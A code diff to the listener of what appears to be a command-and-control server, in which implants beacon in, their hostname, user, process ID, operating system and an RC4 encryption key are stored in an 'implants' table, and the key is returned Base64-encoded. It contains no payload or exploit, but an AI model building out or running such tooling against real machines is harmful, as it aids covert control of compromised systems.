@@ -80,6 +80,7 @@ class WebServer(object):
             raw_data = request.get_data()
 
             # if initial Base64 beacon
+            # new beacon
             if self.is_base64(raw_data) is True:
                 # Base64 decodes POST data
                 decoded = base64.b64decode(raw_data).decode()
@@ -98,12 +99,21 @@ class WebServer(object):
                 now = datetime.datetime.now()
                 time = now.strftime("%Y-%m-%d %H:%M:%S")
 
-                # TO DO: INSERT entry into "implants" table
+                # adds en entry into the "implants" table
+                with self.connection.cursor() as cursor:
+                    statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
+                    cursor.execute(statement, (hostname,
+                                           current_user,
+                                           process_id,
+                                           operating_system,
+                                           time,
+                                           encryption_key))
 
                 # returns Base64 encoded encryption key in the HTTP response
                 return base64.b64encode(encryption_key.encode())
 
             # else RC4 beacon
+            # previous beacon
             else:
                 # TO DO: query "implants" table and try to decrypt POST data
 
@@ -153,7 +163,7 @@ class WebServer(object):
         # also closes the database connection
         finally:
             with self.connection.cursor() as cursor:
-                cursor.execute("DELETE FROM listeners")
+                cursor.execute("DELETE FROM `listeners`")
 
             if self.connection.open:
                 self.connection.close()
